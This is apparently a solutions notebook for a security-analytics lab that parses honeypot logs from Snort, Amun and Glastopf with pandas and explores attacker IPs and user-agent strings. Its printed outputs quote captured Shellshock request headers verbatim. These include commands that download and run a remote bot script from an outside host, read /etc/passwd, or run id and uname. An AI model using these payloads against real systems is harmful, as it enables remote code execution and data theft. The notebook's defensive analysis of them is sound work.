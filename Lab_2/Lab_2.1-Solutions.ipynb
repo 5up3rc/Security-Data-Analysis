{
 "metadata": {
  "name": "",
  "signature": "sha256:226025f6b85bbb9efa7bfcb11d7bac0ff47d0e3f8f116eb9a3ed23e5297f2758"
 },
 "nbformat": 3,
 "nbformat_minor": 0,
 "worksheets": [
  {
   "cells": [
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "# Lab 2.1\n",
      "\n",
      "## Introduction\n",
      "More timeseries analysis, but different data. Instead of flow data this lab will examine some data that was gathered from various honeypots. Three different honeypot packages were used to generate this data: Snort, Amun, and Glastopf. <a href=\"http://snort.org/\">Snort</a> looks for patterns in network traffic and can be run in addition to the other types of honeypots. <a href=\"http://amunhoney.sourceforge.net/\">Amun</a> is a low-interaction honeypot that listens on several ports and records connections to those ports. <a href=\"http://glastopf.org/\">Glastopf</a> is another low-interaction honeypot that runs a web server and records client requests.\n",
      "\n",
      "Timeseries graphs and other exploration techniques will be used to understand the types and frequency of scans/attacks against the honeypot infrastructure.\n",
      "___"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "## Exercises\n",
      "\n",
      "### File Input\n",
      "Instead of parsing a CSV file, the JSON output from *mongoexport* will be used."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import pandas as pd\n",
      "import json"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 1
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Execute the following cell to read in one JSON entry from *mongoexport*."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "df = pd.read_json(\"./1.json\")"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 2
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "What does the data look like? Is it in a usable format?"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "df"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "html": [
        "<div style=\"max-height:1000px;max-width:1500px;overflow:auto;\">\n",
        "<table border=\"1\" class=\"dataframe\">\n",
        "  <thead>\n",
        "    <tr style=\"text-align: right;\">\n",
        "      <th></th>\n",
        "      <th>_id</th>\n",
        "      <th>channel</th>\n",
        "      <th>ident</th>\n",
        "      <th>normalized</th>\n",
        "      <th>payload</th>\n",
        "      <th>timestamp</th>\n",
        "    </tr>\n",
        "  </thead>\n",
        "  <tbody>\n",
        "    <tr>\n",
        "      <th>$date</th>\n",
        "      <td>                      NaN</td>\n",
        "      <td> glastopf.events</td>\n",
        "      <td> a16f5f36-3c41-11e4-9ee4-0a0b6e7c3e9e</td>\n",
        "      <td> True</td>\n",
        "      <td> {\"pattern\": \"style_css\", \"time\": \"2014-09-27 0...</td>\n",
        "      <td> 2014-09-27T05:04:46.363+0000</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>$oid</th>\n",
        "      <td> 5426456e9f8c6d41306aea57</td>\n",
        "      <td> glastopf.events</td>\n",
        "      <td> a16f5f36-3c41-11e4-9ee4-0a0b6e7c3e9e</td>\n",
        "      <td> True</td>\n",
        "      <td> {\"pattern\": \"style_css\", \"time\": \"2014-09-27 0...</td>\n",
        "      <td>                          NaN</td>\n",
        "    </tr>\n",
        "  </tbody>\n",
        "</table>\n",
        "</div>"
       ],
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 3,
       "text": [
        "                            _id          channel  \\\n",
        "$date                       NaN  glastopf.events   \n",
        "$oid   5426456e9f8c6d41306aea57  glastopf.events   \n",
        "\n",
        "                                      ident normalized  \\\n",
        "$date  a16f5f36-3c41-11e4-9ee4-0a0b6e7c3e9e       True   \n",
        "$oid   a16f5f36-3c41-11e4-9ee4-0a0b6e7c3e9e       True   \n",
        "\n",
        "                                                 payload  \\\n",
        "$date  {\"pattern\": \"style_css\", \"time\": \"2014-09-27 0...   \n",
        "$oid   {\"pattern\": \"style_css\", \"time\": \"2014-09-27 0...   \n",
        "\n",
        "                          timestamp  \n",
        "$date  2014-09-27T05:04:46.363+0000  \n",
        "$oid                            NaN  "
       ]
      }
     ],
     "prompt_number": 3
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Since the data doesn't quite look ready-to-use one of IPython's other features of loading an external Python script can be used to fire up some parsing code. In the following cell use the **%load** magic word, and the file you'll want to load is *readhoneydata.py*."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "%load readhoneydata.py"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 4
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "f = open('./honeypot.json', 'r')\n",
      "count = 0\n",
      "glastopf = []\n",
      "amun = []\n",
      "snort = []\n",
      "for line in f:\n",
      "    j = json.loads(line)\n",
      "    temp = []\n",
      "    temp.append(j[\"_id\"][\"$oid\"])\n",
      "    temp.append(j[\"ident\"])\n",
      "    temp.append(j[\"normalized\"])\n",
      "    temp.append(j[\"timestamp\"][\"$date\"])\n",
      "    temp.append(j[\"channel\"])\n",
      "    payload = json.loads(j[\"payload\"])\n",
      "    if j[\"channel\"] == \"glastopf.events\":\n",
      "        temp.append(payload[\"pattern\"])\n",
      "        temp.append(payload[\"filename\"])\n",
      "        temp.append(payload[\"request_raw\"])\n",
      "        temp.append(payload[\"request_url\"])\n",
      "        temp.append(payload[\"source\"][0])\n",
      "        temp.append(payload[\"source\"][1])\n",
      "        glastopf.append(temp)\n",
      "    elif j[\"channel\"] == \"amun.events\":\n",
      "        temp.append(payload[\"attackerIP\"])\n",
      "        temp.append(payload[\"attackerPort\"])\n",
      "        temp.append(payload[\"victimIP\"])\n",
      "        temp.append(payload[\"victimPort\"])\n",
      "        temp.append(payload[\"connectionType\"])\n",
      "        amun.append(temp)\n",
      "    elif j[\"channel\"] == \"snort.alerts\":\n",
      "        temp.append(payload[\"source_ip\"])\n",
      "        if \"source_port\" in payload:\n",
      "            temp.append(payload[\"source_port\"])\n",
      "        else:\n",
      "            temp.append(\"0\")\n",
      "        temp.append(payload[\"destination_ip\"])\n",
      "        if \"destination_port\" in payload:\n",
      "            temp.append(payload[\"destination_port\"])\n",
      "        else:\n",
      "            temp.append(\"0\")\n",
      "        temp.append(payload[\"signature\"])\n",
      "        temp.append(payload[\"classification\"])\n",
      "        temp.append(payload[\"proto\"])\n",
      "        snort.append(temp)\n",
      "    else:\n",
      "        print j\n",
      "f.close()\n"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 5
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Quickly build the dataframes from the lists of lists."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "amun_df = pd.DataFrame(amun, columns=['id','ident','normalized','timestamp','channel','attackerIP','attackerPort','victimIP','victimPort','connectionType'])\n",
      "glastopf_df = pd.DataFrame(glastopf, columns=['id','ident','normalized','timestamp','channel','pattern','filename','request_raw','request_url','attackerIP','attackerPort'])\n",
      "snort_df = pd.DataFrame(snort, columns=['id','ident','normalized','timestamp','channel','attackerIP','attackerPort','victimIP','victimPort','signature','classification','proto'])"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 6
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Check out the dataframes (amun_df, glastopf_df, and snort_df) and get a quick feel to see the types of data in them.\n",
      "\n",
      "**Hint**: Try running the **head()** and **dtypes** functions on the dataframes."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "amun_df.dtypes"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 7,
       "text": [
        "id                object\n",
        "ident             object\n",
        "normalized          bool\n",
        "timestamp         object\n",
        "channel           object\n",
        "attackerIP        object\n",
        "attackerPort       int64\n",
        "victimIP          object\n",
        "victimPort         int64\n",
        "connectionType    object\n",
        "dtype: object"
       ]
      }
     ],
     "prompt_number": 7
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### Data Cleanup\n",
      "**SPOILER ALERT**\n",
      "\n",
      "Since the timestamp column isn't a datetime data type we need to fix that. Below is an example that shows what had to be done to the amun dataframe, add in the glastopf and snort ones as well."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "amun_df['timestamp'] = amun_df['timestamp'].apply(lambda x: str(x).replace('T', 'T '))\n",
      "glastopf_df['timestamp'] = glastopf_df['timestamp'].apply(lambda x: str(x).replace('T', 'T '))\n",
      "snort_df['timestamp'] = snort_df['timestamp'].apply(lambda x: str(x).replace('T', 'T '))"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 8
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "amun_df['timestamp'] = pd.to_datetime(amun_df['timestamp'])\n",
      "glastopf_df['timestamp'] = pd.to_datetime(glastopf_df['timestamp'])\n",
      "snort_df['timestamp'] = pd.to_datetime(snort_df['timestamp'])"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 9
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Don't forget to double check that the timestamp column is now a datetime object type.\n",
      "\n",
      "### Data Augmentation\n",
      "1. Add a column to *glastopf_df* called *victimPort* and assign it the value **80**.\n",
      "2. Add country name to all three dataframes by using the GeoIP module, one example has already been provided.\n",
      "\n",
      "This product includes GeoLite2 data created by MaxMind, available from <a href=\"http://www.maxmind.com\">http://www.maxmind.com</a>."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import GeoIP\n",
      "\n",
      "gi = GeoIP.new(GeoIP.GEOIP_MEMORY_CACHE)\n",
      "\n",
      "amun_df['attackerCountry'] = amun_df['attackerIP'].apply(lambda x: gi.country_name_by_addr(x))\n",
      "glastopf_df['attackerCountry'] = glastopf_df['attackerIP'].apply(lambda x: gi.country_name_by_addr(x))\n",
      "snort_df['attackerCountry'] = snort_df['attackerIP'].apply(lambda x: gi.country_name_by_addr(x))\n",
      "\n",
      "glastopf_df['victimPort'] = 80"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 10
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Create a new dataframe that has some common information from the other three dataframes."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "cols = ['channel','timestamp','attackerIP','victimPort','attackerCountry']\n",
      "attacker_df = pd.DataFrame()\n",
      "attacker_df = attacker_df.append(snort_df[cols], ignore_index=True)\n",
      "attacker_df = attacker_df.append(amun_df[cols], ignore_index=True)\n",
      "attacker_df = attacker_df.append(glastopf_df[cols], ignore_index=True)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 11
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### Reindex\n",
      "Using what you learned in the first part of the lab set the index for the *attacker_df* to the *timestamp* column."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "attacker_df = attacker_df.set_index('timestamp')"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 12
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### Basic Exploration\n",
      "What are the top 10 most active IPs in the *attacker_df*? What honeypot type picked up this attacker, and what port(s) was this attacker especially fond of.\n",
      "\n",
      "**Hint** Incase you forgot, the honeypot type is stored in the *channel* column, and the port(s) are stored in the *victimPort* column."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "attacker_df['attackerIP'].value_counts()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 13,
       "text": [
        "61.153.106.24      50212\n",
        "1.34.22.39           807\n",
        "54.169.67.18         792\n",
        "54.169.105.43        792\n",
        "54.169.105.65        792\n",
        "54.169.1.199         792\n",
        "101.69.247.10        311\n",
        "202.102.48.186       293\n",
        "61.163.217.30        249\n",
        "173.201.38.150       190\n",
        "122.226.102.62       172\n",
        "74.222.1.15          156\n",
        "218.77.79.58         148\n",
        "222.175.241.131      140\n",
        "117.21.173.140       132\n",
        "...\n",
        "124.118.216.241    1\n",
        "84.192.34.112      1\n",
        "117.95.154.130     1\n",
        "62.215.162.23      1\n",
        "41.142.50.6        1\n",
        "130.229.192.10     1\n",
        "93.102.131.185     1\n",
        "66.76.93.116       1\n",
        "91.203.5.78        1\n",
        "58.241.61.162      1\n",
        "103.20.148.157     1\n",
        "50.193.73.122      1\n",
        "112.229.76.82      1\n",
        "180.175.172.119    1\n",
        "208.66.134.203     1\n",
        "Length: 1032, dtype: int64"
       ]
      }
     ],
     "prompt_number": 13
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "print attacker_df[attacker_df['attackerIP'] == '61.153.106.24']['channel'].unique()\n",
      "amun_df[amun_df['attackerIP'] == '61.153.106.24']['victimPort'].unique()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "[u'amun.events']\n"
       ]
      },
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 14,
       "text": [
        "array([135])"
       ]
      }
     ],
     "prompt_number": 14
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "This is one way that values can be pulled out from other column values. In this instance a new column called *user-agent* is created from the header captured in the Glastopf honeypot."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import re\n",
      "\n",
      "regex = re.compile('.*[Uu][Ss][Ee][Rr]-[Aa][Gg][Ee][Nn][Tt]:(.*?)(?:\\\\r|$)')\n",
      "glastopf_df['user-agent'] = glastopf_df['request_raw'].apply(lambda x: re.search(regex, x).group(1) if re.search(regex, x) else None)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 15
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "What are some of the more popular user-agent strings? Find any interesting patterns?"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "glastopf_df['user-agent'].value_counts()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 16,
       "text": [
        " Mozilla/3.0 (compatible; Indy Library)                         39\n",
        " Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]    30\n",
        " () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    27\n",
        " Cloud mapping experiment. Contact research@pdrlabs.net         23\n",
        " () { foo;};echo; /usr/bin/id                                   20\n",
        " ZmEu                                                           13\n",
        " Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.122 Safari/537.36     9\n",
        " Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36     9\n",
        " Morfeus Fucking Scanner                                         5\n",
        " Googlebot/2.1 (+http://www.google.com/bot.html)                 5\n",
        " Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)     4\n",
        " masscan/1.0 (https://github.com/robertdavidgraham/masscan)      4\n",
        " Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)                  4\n",
        " Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:20.0) Gecko/20100101 Firefox/20.0     4\n",
        " Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)     3\n",
        " Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0     3\n",
        " Mozilla/5.0 (compatible; Muenster University of Applied Sciences; +http://fb02itsscan.fh-muenster.de)     2\n",
        " Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)     2\n",
        " Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25     2\n",
        " () { :;}; /bin/bash -c \"echo testing9123123\"; /bin/uname -a     2\n",
        " Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)     2\n",
        " Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)     2\n",
        " IPv4Scan (+http://ipv4scan.com)                                 2\n",
        " libwww-perl/6.08                                                1\n",
        " Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)     1\n",
        " Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)     1\n",
        " Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.7.83) Gecko/20101180 Firefox/3.5.47     1\n",
        " () { :;}; /bin/bash -c \"wget http://stablehost.us/bots/regular.bot -O /tmp/sh;curl -o /tmp/sh http://stablehost.us/bots/regular.bot;sh /tmp/sh;rm -rf /tmp/sh\"     1\n",
        " Mozilla/5.0                                                     1\n",
        " curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.15.3 zlib/1.2.3 libidn/1.18 libssh2/1.4.2     1\n",
        " Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20140610 Firefox/24.0 PaleMoon/24.6.2     1\n",
        " Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6     1\n",
        " () { :; }; echo X-Bash-Test: `echo glXpsoaBEf`;                 1\n",
        " () { :;}; echo \"BigBang: \" $(</etc/passwd)                      1\n",
        " Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0     1\n",
        "dtype: int64"
       ]
      }
     ],
     "prompt_number": 16
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "When you've found some patterns worth exploring, what else can you come up with.\n",
      "\n",
      "You can use the **str.contains()** function to see what rows contain a specific substring. One example has been provided, the query in the cell below is an easy way to query for all entries that may contain a shellshock exploit attempt."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "glastopf_df[glastopf_df['request_raw'].str.contains('{ :;}')]['request_raw'].value_counts()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 17,
       "text": [
        "GET / HTTP/1.0\\r\\nAccept: */*\\r\\nReferer: () { :;}; echo \"BigBang: \" $(</etc/passwd)\\r\\nUser-Agent: () { :;}; echo \"BigBang: \" $(</etc/passwd)    1\n",
        "GET / HTTP/1.1\\r\\nHost: 162.197.24.67\\r\\nUser-Agent: () { :;}; /bin/bash -c \"echo testing9123123\"; /bin/uname -a    1\n",
        "GET / HTTP/1.1\\r\\nHost: 54.68.96.53\\r\\nUser-Agent: () { :;}; /bin/bash -c \"echo testing9123123\"; /bin/uname -a    1\n",
        "GET / HTTP/1.0\\r\\nHost: 54.68.96.53\\r\\nUser-Agent: () { :;}; /bin/bash -c \"wget http://stablehost.us/bots/regular.bot -O /tmp/sh;curl -o /tmp/sh http://stablehost.us/bots/regular.bot;sh /tmp/sh;rm -rf /tmp/sh\"    1\n",
        "dtype: int64"
       ]
      }
     ],
     "prompt_number": 17
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "glastopf_df[glastopf_df['request_raw'].str.contains('};')]['request_raw'].value_counts()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 18,
       "text": [
        "GET /guestbook.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /cgi-bin/awstats.pl HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /cgi-bin/guestbook.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /webnovel/books.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /cgi-bin/upload.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /cgi-bin/login.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /iControl/iControlPortal.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /cgi-bin/learn-message.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /webmail/login.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /cgi-mod/view_help.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /cgi/close_window.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /cgi-bin/ICuGI/EST/blast_detail.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; /usr/bin/id\\r\\nUser-Agent: () { foo;};echo; /usr/bin/id    1\n",
        "GET /cgi-bin/authLogin.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nAccept-Charset: GBK,utf-8;q=0.7,*;q=0.3\\r\\nAccept-Encoding: identity\\r\\nAccept-Language: zh-CN,zh;q=0.8\\r\\nCache-Control: max-age=0\\r\\nConnection: close\\r\\nCookie: \\r\\nHost: 162.197.24.67:8080\\r\\nReferer: http://www.baidu.com\\r\\nUser-Agent: () { :; }; echo X-Bash-Test: `echo glXpsoaBEf`;    1\n",
        "GET /cgi-bin/test.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    1\n",
        "GET /cgi-bin/tree.php HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; /usr/bin/id\\r\\nUser-Agent: () { foo;};echo; /usr/bin/id    1\n",
        "GET / HTTP/1.1\\r\\nHost: 162.197.24.67\\r\\nUser-Agent: () { :;}; /bin/bash -c \"echo testing9123123\"; /bin/uname -a    1\n",
        "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; /usr/bin/id\\r\\nUser-Agent: () { foo;};echo; /usr/bin/id    1\n",
        "GET /dana-na/auth/url_default/welcome.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; /usr/bin/id\\r\\nUser-Agent: () { foo;};echo; /usr/bin/id    1\n",
        "GET /cgi-mod/index.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    1\n",
        "GET /cgi-bin///admin.html HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; /usr/bin/id\\r\\nUser-Agent: () { foo;};echo; /usr/bin/id    1\n",
        "GET /cgi-bin/php5 HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; /usr/bin/id\\r\\nUser-Agent: () { foo;};echo; /usr/bin/id    1\n",
        "GET / HTTP/1.1\\r\\nHost: 54.68.96.53\\r\\nUser-Agent: () { :;}; /bin/bash -c \"echo testing9123123\"; /bin/uname -a    1\n",
        "GET /login.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    1\n",
        "GET /cgi-bin/admin.html HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; /usr/bin/id\\r\\nUser-Agent: () { foo;};echo; /usr/bin/id    1\n",
        "GET /cgi-bin/w3mman2html.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; /usr/bin/id\\r\\nUser-Agent: () { foo;};echo; /usr/bin/id    1\n",
        "GET /cgi-bin/php-cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; /usr/bin/id\\r\\nUser-Agent: () { foo;};echo; /usr/bin/id    1\n",
        "GET /cgi-bin/hello HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; /usr/bin/id\\r\\nUser-Agent: () { foo;};echo; /usr/bin/id    1\n",
        "GET /cgi-bin/test-cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; /usr/bin/id\\r\\nUser-Agent: () { foo;};echo; /usr/bin/id    1\n",
        "GET /gitweb/gitweb.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; /usr/bin/id\\r\\nUser-Agent: () { foo;};echo; /usr/bin/id    1\n",
        "GET /cgi-bin/php4 HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; /usr/bin/id\\r\\nUser-Agent: () { foo;};echo; /usr/bin/id    1\n",
